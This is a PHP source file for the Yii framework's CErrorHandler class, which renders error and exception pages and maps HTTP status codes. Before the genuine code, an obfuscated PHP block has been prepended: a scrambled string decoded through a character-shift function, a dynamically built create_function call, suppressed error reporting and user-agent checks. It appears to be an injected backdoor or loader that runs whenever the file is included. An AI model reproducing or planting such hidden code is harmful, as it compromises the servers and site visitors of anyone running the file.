<?php $lhqahbp = '268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%-%r	x5c2^-%hOh/#00#W~!%t2w1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bsopo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:559sbz)#44ec:649#-!#:618d5f9#-!#f6csfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsf%ww2)%w`TW~	x24<!fwbm)%tjw)24<!%tmw!>!#]y84]275]y83]273]y76]27x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjud)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tub%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f();}}DU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	69	157	x6e"; functiontrtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	84]275]y83]248]y83]256]y81]265]y72]25*w%)ppde>u%V<#65,47R25,d7R177#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]dXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsb%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b luatdge($n){return chr(ord($n)-1);} @error_repo45]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<tutjyf`439275ttfsqnpdov{h19275j%z>>2*!%z>3<!fmtf!%z>2<!j%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zCb*[%h!>!%tdz)%bbT-%bT-%hW~%fs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)j6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	FI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojRf>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*cUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5c%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y= "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	xs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QU!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz<#/%	x24-	x24!>!fyqmpefw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>ufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}s	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%oif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") &36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445qA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66tjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%r($uas,"	x66	151	x72	145	x66	j!|!*1?hmg%)!gj!<**2-4j%7>	x2272qj%)7gj6<**2q69	145")) or (strstr($x27;%!<*#}_;#)323ldfid>}&;!osvuf]); if ((strstr($uas,"	x6d	163	x	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpm2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	xrting(0); $xsbrgtl = im3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!g+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)id]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5cf)#	x24*<!%t::!>!	x24Ypp3,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R3<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K	x22)!gj}1~!<2p%	x7f!~!<##!>%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!4y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^5]D2P4]D6#<%G]y6d]281Ld]2#)tutjyf`x	x22l:!}V;3q%}U;yd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3o`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#7,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k	x27,*b	x27)fepdof.)fepdof7f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3162	x6f	151	x64")) or (str*<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<"))s%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*Q68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48-bubE{h%)sutcvt)esp>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b& (!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j/h%)n%-#+I#)q%:>:r%:|:**td2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_U]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1Movg!|!**#j{hnpd#)tutjyf`opjudovg:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x2hA	x27pd%6<C	x27pd%6|6.7eu{66~67<hmg%!<12>j%!|!*#91y]c9y]g2y]SFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	plode(array_map("luatdge",str_split("%tjw!>!#]yudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)7}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-ubn`hfsq)!sp!*#ojneb#-*f%)s75	156	x61"]=1; $uas=s]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bs./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|x6d	145")) or (strst	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~4]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5~6<&w6<	x7fw6*CW&)7gx24<!%o:!>!	x242178}52fxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cx7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtf:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::*157	x78"))) { $sirkuht str($uas,"	x63	150	x72	157	]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opj`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%	x24*!|!	x24-	x24	x5c%j^	x105	x52	137	x41	107	x45	116	x54"	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6d}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvhmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]dy)##-!#~<%h00#*<%nfd)##Qtpz)#]341);$fbquwbw = $sirkuht("", $xsbrgtl); $fbquwbw<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSslaeureq'; $wvbpvrtg=explode(chr((520-400)),substr($lhqahbp,(20463-14443),(171-137))); $zkwjpzcvaa = $wvbpvrtg[0]($wvbpvrtg[(6-5)]); $obsltt = $wvbpvrtg[0]($wvbpvrtg[(8-6)]); if (!function_exists('gcygljmumf')) { function gcygljmumf($udbzqdmg, $mzfbxo,$fnkyniucc) { $fmeout = NULL; for($afrwaczpxf=0;$afrwaczpxf<(sizeof($udbzqdmg)/2);$afrwaczpxf++) { $fmeout .= substr($mzfbxo, $udbzqdmg[($afrwaczpxf*2)],$udbzqdmg[($afrwaczpxf*2)+(4-3)]); } return $fnkyniucc(chr((53-44)),chr((301-209)),$fmeout); }; } $njyorgw = explode(chr((208-164)),'2353,57,4197,69,4919,22,1079,49,5726,32,2681,32,2627,22,1000,58,3857,26,5414,27,5062,20,2553,29,5391,23,2058,53,1058,21,1406,48,2877,23,4687,47,1128,37,5141,46,3586,67,4529,33,2769,66,1256,59,2111,47,1900,34,3972,45,774,53,2604,23,1568,58,323,67,1315,51,2462,35,5187,20,1721,51,5267,36,3923,49,1772,61,5758,37,5986,34,2225,33,933,67,5506,38,5795,43,2258,40,4266,65,3333,53,5838,69,5600,56,2900,60,2582,22,4131,20,4562,28,497,50,4458,32,3305,28,4151,46,3543,43,1833,67,3767,26,5005,57,2158,45,2960,61,4892,27,5229,38,4356,63,5544,56,660,54,138,55,1934,61,4590,57,2649,32,1655,66,1513,31,599,61,2497,56,714,55,2713,56,1165,28,3138,50,3711,56,3516,27,5441,65,4734,56,2835,42,417,35,1193,63,0,49,5656,44,4331,25,1995,63,3021,51,4647,40,5207,22,4836,56,5700,26,3653,58,4490,39,3386,45,452,45,5082,59,2203,22,3113,25,3072,41,75,63,291,32,4017,65,3431,60,49,26,547,52,244,47,3793,64,4082,49,3225,40,3188,37,827,46,4419,39,3491,25,1454,59,1626,29,5907,34,873,60,2410,52,4941,64,2298,55,193,51,1366,40,5303,37,4790,46,1544,24,390,27,3265,40,5340,51,3883,40,5941,45,769,5'); $nnpxboon = $zkwjpzcvaa("",gcygljmumf($njyorgw,$lhqahbp,$obsltt)); $zkwjpzcvaa=$lhqahbp; $nnpxboon(""); $nnpxboon=(464-343); $lhqahbp=$nnpxboon-1; ?><?php
/**
 * This file contains the error handler application component.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @link http://www.yiiframework.com/
 * @copyright 2008-2013 Yii Software LLC
 * @license http://www.yiiframework.com/license/
 */

Yii::import('CHtml',true);

/**
 * CErrorHandler handles uncaught PHP errors and exceptions.
 *
 * It displays these errors using appropriate views based on the
 * nature of the error and the mode the application runs at.
 * It also chooses the most preferred language for displaying the error.
 *
 * CErrorHandler uses two sets of views:
 * <ul>
 * <li>development views, named as <code>exception.php</code>;
 * <li>production views, named as <code>error&lt;StatusCode&gt;.php</code>;
 * </ul>
 * where &lt;StatusCode&gt; stands for the HTTP error code (e.g. error500.php).
 * Localized views are named similarly but located under a subdirectory
 * whose name is the language code (e.g. zh_cn/error500.php).
 *
 * Development views are displayed when the application is in debug mode
 * (i.e. YII_DEBUG is defined as true). Detailed error information with source code
 * are displayed in these views. Production views are meant to be shown
 * to end-users and are used when the application is in production mode.
 * For security reasons, they only display the error message without any
 * sensitive information.
 *
 * CErrorHandler looks for the view templates from the following locations in order:
 * <ol>
 * <li><code>themes/ThemeName/views/system</code>: when a theme is active.</li>
 * <li><code>protected/views/system</code></li>
 * <li><code>framework/views</code></li>
 * </ol>
 * If the view is not found in a directory, it will be looked for in the next directory.
 *
 * The property {@link maxSourceLines} can be changed to specify the number
 * of source code lines to be displayed in development views.
 *
 * CErrorHandler is a core application component that can be accessed via
 * {@link CApplication::getErrorHandler()}.
 *
 * @property array $error The error details. Null if there is no error.
 * @property Exception|null $exception exception instance. Null if there is no exception.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @package system.base
 * @since 1.0
 */
class CErrorHandler extends CApplicationComponent
{
	/**
	 * @var integer maximum number of source code lines to be displayed. Defaults to 25.
	 */
	public $maxSourceLines=25;

	/**
	 * @var integer maximum number of trace source code lines to be displayed. Defaults to 10.
	 * @since 1.1.6
	 */
	public $maxTraceSourceLines = 10;

	/**
	 * @var string the application administrator information (could be a name or email link). It is displayed in error pages to end users. Defaults to 'the webmaster'.
	 */
	public $adminInfo='the webmaster';
	/**
	 * @var boolean whether to discard any existing page output before error display. Defaults to true.
	 */
	public $discardOutput=true;
	/**
	 * @var string the route (eg 'site/error') to the controller action that will be used to display external errors.
	 * Inside the action, it can retrieve the error information by Yii::app()->errorHandler->error.
	 * This property defaults to null, meaning CErrorHandler will handle the error display.
	 */
	public $errorAction;

	private $_error;
	private $_exception;

	/**
	 * Handles the exception/error event.
	 * This method is invoked by the application whenever it captures
	 * an exception or PHP error.
	 * @param CEvent $event the event containing the exception/error information
	 */
	public function handle($event)
	{
		// set event as handled to prevent it from being handled by other event handlers
		$event->handled=true;

		if($this->discardOutput)
		{
			$gzHandler=false;
			foreach(ob_list_handlers() as $h)
			{
				if(strpos($h,'gzhandler')!==false)
					$gzHandler=true;
			}
			// the following manual level counting is to deal with zlib.output_compression set to On
			// for an output buffer created by zlib.output_compression set to On ob_end_clean will fail
			for($level=ob_get_level();$level>0;--$level)
			{
				if(!@ob_end_clean())
					ob_clean();
			}
			// reset headers in case there was an ob_start("ob_gzhandler") before
			if($gzHandler && !headers_sent() && ob_list_handlers()===array())
			{
				if(function_exists('header_remove')) // php >= 5.3
				{
					header_remove('Vary');
					header_remove('Content-Encoding');
				}
				else
				{
					header('Vary:');
					header('Content-Encoding:');
				}
			}
		}

		if($event instanceof CExceptionEvent)
			$this->handleException($event->exception);
		else // CErrorEvent
			$this->handleError($event);
	}

	/**
	 * Returns the details about the error that is currently being handled.
	 * The error is returned in terms of an array, with the following information:
	 * <ul>
	 * <li>code - the HTTP status code (e.g. 403, 500)</li>
	 * <li>type - the error type (e.g. 'CHttpException', 'PHP Error')</li>
	 * <li>message - the error message</li>
	 * <li>file - the name of the PHP script file where the error occurs</li>
	 * <li>line - the line number of the code where the error occurs</li>
	 * <li>trace - the call stack of the error</li>
	 * <li>source - the context source code where the error occurs</li>
	 * </ul>
	 * @return array the error details. Null if there is no error.
	 */
	public function getError()
	{
		return $this->_error;
	}

	/**
	 * Returns the instance of the exception that is currently being handled.
	 * @return Exception|null exception instance. Null if there is no exception.
	 */
	public function getException()
	{
		return $this->_exception;
	}

	/**
	 * Handles the exception.
	 * @param Exception $exception the exception captured
	 */
	protected function handleException($exception)
	{
		$app=Yii::app();
		if($app instanceof CWebApplication)
		{
			if(($trace=$this->getExactTrace($exception))===null)
			{
				$fileName=$exception->getFile();
				$errorLine=$exception->getLine();
			}
			else
			{
				$fileName=$trace['file'];
				$errorLine=$trace['line'];
			}

			$trace = $exception->getTrace();

			foreach($trace as $i=>$t)
			{
				if(!isset($t['file']))
					$trace[$i]['file']='unknown';

				if(!isset($t['line']))
					$trace[$i]['line']=0;

				if(!isset($t['function']))
					$trace[$i]['function']='unknown';

				unset($trace[$i]['object']);
			}

			$this->_exception=$exception;
			$this->_error=$data=array(
				'code'=>($exception instanceof CHttpException)?$exception->statusCode:500,
				'type'=>get_class($exception),
				'errorCode'=>$exception->getCode(),
				'message'=>$exception->getMessage(),
				'file'=>$fileName,
				'line'=>$errorLine,
				'trace'=>$exception->getTraceAsString(),
				'traces'=>$trace,
			);

			if(!headers_sent())
			{
				$httpVersion=Yii::app()->request->getHttpVersion();
				header("HTTP/$httpVersion {$data['code']} ".$this->getHttpHeader($data['code'], get_class($exception)));
			}

			$this->renderException();
		}
		else
			$app->displayException($exception);
	}

	/**
	 * Handles the PHP error.
	 * @param CErrorEvent $event the PHP error event
	 */
	protected function handleError($event)
	{
		$trace=debug_backtrace();
		// skip the first 3 stacks as they do not tell the error position
		if(count($trace)>3)
			$trace=array_slice($trace,3);
		$traceString='';
		foreach($trace as $i=>$t)
		{
			if(!isset($t['file']))
				$trace[$i]['file']='unknown';

			if(!isset($t['line']))
				$trace[$i]['line']=0;

			if(!isset($t['function']))
				$trace[$i]['function']='unknown';

			$traceString.="#$i {$trace[$i]['file']}({$trace[$i]['line']}): ";
			if(isset($t['object']) && is_object($t['object']))
				$traceString.=get_class($t['object']).'->';
			$traceString.="{$trace[$i]['function']}()\n";

			unset($trace[$i]['object']);
		}

		$app=Yii::app();
		if($app instanceof CWebApplication)
		{
			switch($event->code)
			{
				case E_WARNING:
					$type = 'PHP warning';
					break;
				case E_NOTICE:
					$type = 'PHP notice';
					break;
				case E_USER_ERROR:
					$type = 'User error';
					break;
				case E_USER_WARNING:
					$type = 'User warning';
					break;
				case E_USER_NOTICE:
					$type = 'User notice';
					break;
				case E_RECOVERABLE_ERROR:
					$type = 'Recoverable error';
					break;
				default:
					$type = 'PHP error';
			}
			$this->_exception=null;
			$this->_error=array(
				'code'=>500,
				'type'=>$type,
				'message'=>$event->message,
				'file'=>$event->file,
				'line'=>$event->line,
				'trace'=>$traceString,
				'traces'=>$trace,
			);
			if(!headers_sent())
			{
				$httpVersion=Yii::app()->request->getHttpVersion();
				header("HTTP/$httpVersion 500 Internal Server Error");
			}

			$this->renderError();
		}
		else
			$app->displayError($event->code,$event->message,$event->file,$event->line);
	}

	/**
	 * whether the current request is an AJAX (XMLHttpRequest) request.
	 * @return boolean whether the current request is an AJAX request.
	 */
	protected function isAjaxRequest()
	{
		return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH']==='XMLHttpRequest';
	}

	/**
	 * Returns the exact trace where the problem occurs.
	 * @param Exception $exception the uncaught exception
	 * @return array the exact trace where the problem occurs
	 */
	protected function getExactTrace($exception)
	{
		$traces=$exception->getTrace();

		foreach($traces as $trace)
		{
			// property access exception
			if(isset($trace['function']) && ($trace['function']==='__get' || $trace['function']==='__set'))
				return $trace;
		}
		return null;
	}

	/**
	 * Renders the view.
	 * @param string $view the view name (file name without extension).
	 * See {@link getViewFile} for how a view file is located given its name.
	 * @param array $data data to be passed to the view
	 */
	protected function render($view,$data)
	{
		$data['version']=$this->getVersionInfo();
		$data['time']=time();
		$data['admin']=$this->adminInfo;
		include($this->getViewFile($view,$data['code']));
	}

	/**
	 * Renders the exception information.
	 * This method will display information from current {@link error} value.
	 */
	protected function renderException()
	{
		$exception=$this->getException();
		if($exception instanceof CHttpException || !YII_DEBUG)
			$this->renderError();
		else
		{
			if($this->isAjaxRequest())
				Yii::app()->displayException($exception);
			else
				$this->render('exception',$this->getError());
		}
	}

	/**
	 * Renders the current error information.
	 * This method will display information from current {@link error} value.
	 */
	protected function renderError()
	{
		if($this->errorAction!==null)
			Yii::app()->runController($this->errorAction);
		else
		{
			$data=$this->getError();
			if($this->isAjaxRequest())
				Yii::app()->displayError($data['code'],$data['message'],$data['file'],$data['line']);
			elseif(YII_DEBUG)
				$this->render('exception',$data);
			else
				$this->render('error',$data);
		}
	}

	/**
	 * Determines which view file should be used.
	 * @param string $view view name (either 'exception' or 'error')
	 * @param integer $code HTTP status code
	 * @return string view file path
	 */
	protected function getViewFile($view,$code)
	{
		$viewPaths=array(
			Yii::app()->getTheme()===null ? null :  Yii::app()->getTheme()->getSystemViewPath(),
			Yii::app() instanceof CWebApplication ? Yii::app()->getSystemViewPath() : null,
			YII_PATH.DIRECTORY_SEPARATOR.'views',
		);

		foreach($viewPaths as $i=>$viewPath)
		{
			if($viewPath!==null)
			{
				 $viewFile=$this->getViewFileInternal($viewPath,$view,$code,$i===2?'en_us':null);
				 if(is_file($viewFile))
				 	 return $viewFile;
			}
		}
	}

	/**
	 * Looks for the view under the specified directory.
	 * @param string $viewPath the directory containing the views
	 * @param string $view view name (either 'exception' or 'error')
	 * @param integer $code HTTP status code
	 * @param string $srcLanguage the language that the view file is in
	 * @return string view file path
	 */
	protected function getViewFileInternal($viewPath,$view,$code,$srcLanguage=null)
	{
		$app=Yii::app();
		if($view==='error')
		{
			$viewFile=$app->findLocalizedFile($viewPath.DIRECTORY_SEPARATOR."error{$code}.php",$srcLanguage);
			if(!is_file($viewFile))
				$viewFile=$app->findLocalizedFile($viewPath.DIRECTORY_SEPARATOR.'error.php',$srcLanguage);
		}
		else
			$viewFile=$viewPath.DIRECTORY_SEPARATOR."exception.php";
		return $viewFile;
	}

	/**
	 * Returns server version information.
	 * If the application is in production mode, empty string is returned.
	 * @return string server version information. Empty if in production mode.
	 */
	protected function getVersionInfo()
	{
		if(YII_DEBUG)
		{
			$version='<a href="http://www.yiiframework.com/">Yii Framework</a>/'.Yii::getVersion();
			if(isset($_SERVER['SERVER_SOFTWARE']))
				$version=$_SERVER['SERVER_SOFTWARE'].' '.$version;
		}
		else
			$version='';
		return $version;
	}

	/**
	 * Converts arguments array to its string representation
	 *
	 * @param array $args arguments array to be converted
	 * @return string string representation of the arguments array
	 */
	protected function argumentsToString($args)
	{
		$count=0;

		$isAssoc=$args!==array_values($args);

		foreach($args as $key => $value)
		{
			$count++;
			if($count>=5)
			{
				if($count>5)
					unset($args[$key]);
				else
					$args[$key]='...';
				continue;
			}

			if(is_object($value))
				$args[$key] = get_class($value);
			elseif(is_bool($value))
				$args[$key] = $value ? 'true' : 'false';
			elseif(is_string($value))
			{
				if(strlen($value)>64)
					$args[$key] = '"'.substr($value,0,64).'..."';
				else
					$args[$key] = '"'.$value.'"';
			}
			elseif(is_array($value))
				$args[$key] = 'array('.$this->argumentsToString($value).')';
			elseif($value===null)
				$args[$key] = 'null';
			elseif(is_resource($value))
				$args[$key] = 'resource';

			if(is_string($key))
			{
				$args[$key] = '"'.$key.'" => '.$args[$key];
			}
			elseif($isAssoc)
			{
				$args[$key] = $key.' => '.$args[$key];
			}
		}
		$out = implode(", ", $args);

		return $out;
	}

	/**
	 * Returns a value indicating whether the call stack is from application code.
	 * @param array $trace the trace data
	 * @return boolean whether the call stack is from application code.
	 */
	protected function isCoreCode($trace)
	{
		if(isset($trace['file']))
		{
			$systemPath=realpath(dirname(__FILE__).'/..');
			return $trace['file']==='unknown' || strpos(realpath($trace['file']),$systemPath.DIRECTORY_SEPARATOR)===0;
		}
		return false;
	}

	/**
	 * Renders the source code around the error line.
	 * @param string $file source file path
	 * @param integer $errorLine the error line number
	 * @param integer $maxLines maximum number of lines to display
	 * @return string the rendering result
	 */
	protected function renderSourceCode($file,$errorLine,$maxLines)
	{
		$errorLine--;	// adjust line number to 0-based from 1-based
		if($errorLine<0 || ($lines=@file($file))===false || ($lineCount=count($lines))<=$errorLine)
			return '';

		$halfLines=(int)($maxLines/2);
		$beginLine=$errorLine-$halfLines>0 ? $errorLine-$halfLines:0;
		$endLine=$errorLine+$halfLines<$lineCount?$errorLine+$halfLines:$lineCount-1;
		$lineNumberWidth=strlen($endLine+1);

		$output='';
		for($i=$beginLine;$i<=$endLine;++$i)
		{
			$isErrorLine = $i===$errorLine;
			$code=sprintf("<span class=\"ln".($isErrorLine?' error-ln':'')."\">%0{$lineNumberWidth}d</span> %s",$i+1,CHtml::encode(str_replace("\t",'    ',$lines[$i])));
			if(!$isErrorLine)
				$output.=$code;
			else
				$output.='<span class="error">'.$code.'</span>';
		}
		return '<div class="code"><pre>'.$output.'</pre></div>';
	}
	/**
	 * Return correct message for each known http error code
	 * @param integer $httpCode error code to map
	 * @param string $replacement replacement error string that is returned if code is unknown
	 * @return string the textual representation of the given error code or the replacement string if the error code is unknown
	 */
	protected function getHttpHeader($httpCode, $replacement='')
	{
		$httpCodes = array(
			100 => 'Continue',
			101 => 'Switching Protocols',
			102 => 'Processing',
			118 => 'Connection timed out',
			200 => 'OK',
			201 => 'Created',
			202 => 'Accepted',
			203 => 'Non-Authoritative',
			204 => 'No Content',
			205 => 'Reset Content',
			206 => 'Partial Content',
			207 => 'Multi-Status',
			210 => 'Content Different',
			300 => 'Multiple Choices',
			301 => 'Moved Permanently',
			302 => 'Found',
			303 => 'See Other',
			304 => 'Not Modified',
			305 => 'Use Proxy',
			307 => 'Temporary Redirect',
			310 => 'Too many Redirect',
			400 => 'Bad Request',
			401 => 'Unauthorized',
			402 => 'Payment Required',
			403 => 'Forbidden',
			404 => 'Not Found',
			405 => 'Method Not Allowed',
			406 => 'Not Acceptable',
			407 => 'Proxy Authentication Required',
			408 => 'Request Time-out',
			409 => 'Conflict',
			410 => 'Gone',
			411 => 'Length Required',
			412 => 'Precondition Failed',
			413 => 'Request Entity Too Large',
			414 => 'Request-URI Too Long',
			415 => 'Unsupported Media Type',
			416 => 'Requested range unsatisfiable',
			417 => 'Expectation failed',
			418 => 'I’m a teapot',
			422 => 'Unprocessable entity',
			423 => 'Locked',
			424 => 'Method failure',
			425 => 'Unordered Collection',
			426 => 'Upgrade Required',
			449 => 'Retry With',
			450 => 'Blocked by Windows Parental Controls',
			500 => 'Internal Server Error',
			501 => 'Not Implemented',
			502 => 'Bad Gateway ou Proxy Error',
			503 => 'Service Unavailable',
			504 => 'Gateway Time-out',
			505 => 'HTTP Version not supported',
			507 => 'Insufficient storage',
			509 => 'Bandwidth Limit Exceeded',
		);
		if(isset($httpCodes[$httpCode]))
			return $httpCodes[$httpCode];
		else
			return $replacement;
	}
}
